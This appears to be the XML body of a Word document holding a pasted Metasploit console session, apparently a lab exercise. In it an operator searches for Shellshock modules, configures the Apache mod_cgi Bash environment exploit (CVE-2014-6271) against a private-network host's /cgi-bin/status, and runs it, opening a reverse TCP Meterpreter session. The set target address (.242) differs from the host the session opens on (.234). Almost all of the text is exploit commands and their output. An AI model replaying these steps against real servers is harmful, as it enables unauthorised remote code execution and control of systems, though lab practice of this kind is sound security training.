        <w:t xml:space="preserve">       =[ metasploit v5.0.65-dev                          ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29561062" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ -- --=[ 1955 exploits - 1092 auxiliary - 336 post       ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65BF4416" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75A3DA94" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>+ -- --=[ 7 evasion                                       ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A0550C2" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28F7F905" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>msf5 &gt; search shellshock</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C1906CA" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77264247" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Matching Modules</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C9A843" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>================</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0048DF98" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06B6881D" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   #   Name                                               Disclosure Date  Rank       Check  Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2390755D" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   -   ----                                               ---------------  ----       -----  -----------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77F334CF" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   0   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="483DD775" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   1   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection (Shellshock)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077F751B" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   2   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FBC38DE" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   3   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32DE6EFF" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   4   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A54F804" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">   5   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48BB80F4" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   6   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C4EDFC3" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   7   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58EB34D9" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   8   exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52575015" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   9   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA81B01" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   10  exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection (Shellshock)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E20EC5A" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   11  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7017FD41" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="635B882B" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4983C6A4" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>msf5 &gt; use 5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F68666E" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="432E7688" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="688620D0" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CA5AA7E" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A8AA94B" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   Name            Current Setting  Required  Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348D9676" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   ----            ---------------  --------  -----------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36D1FC38" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   CMD_MAX_LENGTH  2048             yes       CMD max line length</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C5B188" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B38894C" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   HEADER          User-Agent       yes       HTTP header to use</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F7E8C0" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   METHOD          GET              yes       HTTP method to use</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA8D3CE" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D27FAB" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1478AA73" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="742FC3C2" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   RPORT           80               yes       The target port (TCP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6775DC57" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">   SRVHOST         0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F92E0FB" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   SRVPORT         8080             yes       The local port to listen on.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30CDBBD3" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   SSL             false            no        Negotiate SSL/TLS for outgoing connections</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FAB61CC" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD3A846" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   TARGETURI                        yes       Path to CGI script</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EEB651C" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   TIMEOUT         5                yes       HTTP read response timeout (seconds)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5792E1A6" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   URIPATH                          no        The URI to use for this exploit (default is random)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E78E86" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   VHOST                            no        HTTP server virtual host</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26536FC4" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69F377CF" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C483696" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Exploit target:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3962F208" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23EBF912" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   Id  Name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EBEEB0D" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   --  ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D4C1E72" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   0   Linux x86</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C38FB9E" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5119AE25" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="613AA1CC" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; set rhost 192.168.0.242</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215DFF94" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>rhost =&gt; 192.168.0.242</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E229CE5" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; set targeturi /cgi-bin/status</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E9C5A7" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>targeturi =&gt; /cgi-bin/status</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23503D95" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58575385" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="292C0B38" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">[*] Started reverse TCP handler on 192.168.0.200:4444 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B722BC" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>[*] Command Stager progress - 100.46% done (1097/1092 bytes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21BC5366" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>[*] Sending stage (985320 bytes) to 192.168.0.234</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D8465F" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>[*] Meterpreter session 1 opened (192.168.0.200:4444 -&gt; 192.168.0.234:47176) at 2024-12-01 17:09:31 -0500</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14108DF2" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67B766E3" w14:textId="5A2231D0" w:rsidR="009A241B" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>meterpreter &gt;</w:t>
      </w:r>
    </w:p>
